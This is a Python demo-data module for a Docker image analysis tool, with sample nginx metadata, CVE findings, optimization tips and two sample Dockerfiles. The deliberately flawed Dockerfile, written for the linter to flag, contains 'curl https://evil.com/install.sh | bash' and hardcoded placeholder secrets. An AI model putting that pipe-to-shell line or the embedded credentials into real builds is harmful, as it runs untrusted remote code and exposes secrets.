"""Demo data for Docker Lens — works without Docker installed."""

from __future__ import annotations

from .models import (
    EfficiencyResult,
    Grade,
    ImageAnalysis,
    ImageMetadata,
    LayerInfo,
    OptimizationTip,
    SecurityResult,
    SecurityVulnerability,
    Severity,
)


def get_demo_analysis() -> ImageAnalysis:
    """Return a realistic demo image analysis for nginx:1.25."""
    return ImageAnalysis(
        image="nginx:1.25.3",
        metadata=ImageMetadata(
            id="sha256:a8758716bb6a",
            repo_tags=["nginx:1.25.3", "nginx:latest"],
            repo_digests=["nginx@sha256:abc123def456..."],
            architecture="amd64",
            os="linux",
            created="2024-01-15T08:30:00",
            docker_version="24.0.7",
            size=187_400_000,
            author="",
            labels={
                "maintainer": "NGINX Docker Maintainers <docker-maint@nginx.com>",
                "version": "1.25.3",
            },
            env=[
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                "NGINX_VERSION=1.25.3",
                "NJS_VERSION=0.8.2",
            ],
            exposed_ports=["80/tcp"],
            volumes=[],
            entrypoint=["/docker-entrypoint.sh"],
            cmd=["nginx", "-g", "daemon off;"],
            user="",
            workdir="",
            healthcheck=None,
        ),
        layers=[
            LayerInfo(id="sha256:a1b2c3", created="2024-01-10", created_by="/bin/sh -c #(nop) FROM debian:bookworm-slim", size=74_300_000),
            LayerInfo(id="sha256:d4e5f6", created="2024-01-12", created_by="/bin/sh -c apt-get update && apt-get install -y nginx=1.25.3 openssl=3.0.11 curl=7.88.1 && rm -rf /var/lib/apt/lists/*", size=62_100_000),
            LayerInfo(id="sha256:789abc", created="2024-01-13", created_by="/bin/sh -c #(nop) COPY conf/ /etc/nginx/", size=24_700_000),
            LayerInfo(id="sha256:def012", created="2024-01-13", created_by="/bin/sh -c #(nop) COPY html/ /usr/share/nginx/html/", size=18_200_000),
            LayerInfo(id="sha256:345678", created="2024-01-14", created_by="/bin/sh -c chmod +x /docker-entrypoint.sh", size=5_100_000),
            LayerInfo(id="sha256:9abcde", created="2024-01-15", created_by="/bin/sh -c #(nop) EXPOSE 80", size=0, empty_layer=True),
            LayerInfo(id="sha256:f01234", created="2024-01-15", created_by="/bin/sh -c #(nop) ENTRYPOINT [\"/docker-entrypoint.sh\"]", size=0, empty_layer=True),
            LayerInfo(id="sha256:567890", created="2024-01-15", created_by="/bin/sh -c #(nop) CMD [\"nginx\", \"-g\", \"daemon off;\"]", size=300_000),
        ],
        total_size=187_400_000,
        layer_count=5,
        base_image="debian:bookworm-slim",
        score=72,
        grade=Grade.C,
    )


def get_demo_security() -> SecurityResult:
    """Return a realistic demo security scan result."""
    return SecurityResult(
        image="nginx:1.25.3",
        packages_scanned=147,
        os_detected="Debian Bookworm",
        vulnerabilities=[
            SecurityVulnerability(
                severity=Severity.HIGH,
                package_name="openssl",
                installed_version="3.0.11",
                fixed_version="3.0.12",
                cve_id="CVE-2023-5678",
                title="OpenSSL key/parameter check bypass",
                description="Excessive time spent in DH key generation and parameter checks.",
                url="https://nvd.nist.gov/vuln/detail/CVE-2023-5678",
            ),
            SecurityVulnerability(
                severity=Severity.MEDIUM,
                package_name="curl",
                installed_version="7.88.1",
                fixed_version="8.4.0",
                cve_id="CVE-2023-46218",
                title="curl cookie injection with none-domain",
                description="Cookie injection vulnerability when using none-domain cookies.",
                url="https://nvd.nist.gov/vuln/detail/CVE-2023-46218",
            ),
            SecurityVulnerability(
                severity=Severity.MEDIUM,
                package_name="libexpat",
                installed_version="2.4.7",
                fixed_version="2.5.0",
                cve_id="CVE-2022-43680",
                title="Expat use-after-free in doContent",
                description="Use-after-free vulnerability in doContent function.",
                url="https://nvd.nist.gov/vuln/detail/CVE-2022-43680",
            ),
            SecurityVulnerability(
                severity=Severity.LOW,
                package_name="tar",
                installed_version="1.34",
                fixed_version="1.35",
                cve_id="CVE-2023-39804",
                title="GNU tar stack buffer overflow",
                description="Stack buffer overflow with a long file name in an archive.",
                url="https://nvd.nist.gov/vuln/detail/CVE-2023-39804",
            ),
        ],
        score=73,
        grade=Grade.C,
    )


def get_demo_efficiency() -> EfficiencyResult:
    """Return a realistic demo efficiency analysis."""
    return EfficiencyResult(
        image="nginx:1.25.3",
        total_size=187_400_000,
        wasted_bytes=112_000_000,
        efficiency_score=0.40,
        tips=[
            OptimizationTip(
                category="Base Image",
                title="Switch to Alpine variant",
                description="nginx:alpine is 45 MB vs 187 MB for Debian-based.",
                current_impact="187.4 MB",
                potential_savings="142.4 MB",
                priority=Severity.HIGH,
                fix="FROM nginx:1.25.3-alpine",
                savings_bytes=142_400_000,
            ),
            OptimizationTip(
                category="Layer Optimization",
                title="Combine COPY and chmod",
                description="COPY + chmod in separate layers doubles the file size.",
                current_impact="5.1 MB",
                potential_savings="5.1 MB",
                priority=Severity.MEDIUM,
                fix="COPY --chmod=755 docker-entrypoint.sh /",
                savings_bytes=5_100_000,
            ),
            OptimizationTip(
                category="Security",
                title="Add non-root USER",
                description="Running as root is a security risk.",
                priority=Severity.HIGH,
                fix="USER nginx",
                savings_bytes=0,
            ),
            OptimizationTip(
                category="Health",
                title="Add HEALTHCHECK",
                description="No healthcheck configured — orchestrators can't verify health.",
                priority=Severity.MEDIUM,
                fix="HEALTHCHECK --interval=30s CMD curl -f http://localhost/ || exit 1",
                savings_bytes=0,
            ),
        ],
        total_potential_savings=147_500_000,
        grade=Grade.D,
    )


def get_demo_lint_dockerfile() -> str:
    """Return a sample Dockerfile with intentional issues for demo."""
    return """FROM ubuntu
MAINTAINER john@example.com

RUN apt-get update
RUN apt-get install python3 curl wget git
RUN pip install flask requests numpy
RUN apt-get install -y openssh-server

ENV DB_PASSWORD=secret123
ENV API_KEY=sk-abc123def456

COPY . .

RUN npm install

ADD https://example.com/script.sh /tmp/
RUN curl https://evil.com/install.sh | bash

EXPOSE 22
EXPOSE 8080

CMD python3 app.py
"""


DEMO_GOOD_DOCKERFILE = """# syntax=docker/dockerfile:1

# ── Build stage ───────────────────────────────
FROM python:3.11-slim AS builder

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY src/ ./src/

# ── Production stage ──────────────────────────
FROM python:3.11-slim AS production

LABEL maintainer="team@example.com" \\
      version="1.0.0" \\
      description="Production API server"

WORKDIR /app

RUN groupadd -r appuser && \\
    useradd -r -g appuser -d /app -s /sbin/nologin appuser

COPY --from=builder --chmod=755 /app /app

USER appuser

EXPOSE 8080

HEALTHCHECK --interval=30s --timeout=5s --retries=3 \\
  CMD ["python", "-c", "import urllib.request; urllib.request.urlopen('http://localhost:8080/health')"]

CMD ["python", "-m", "uvicorn", "src.main:app", "--host", "0.0.0.0", "--port", "8080"]
"""
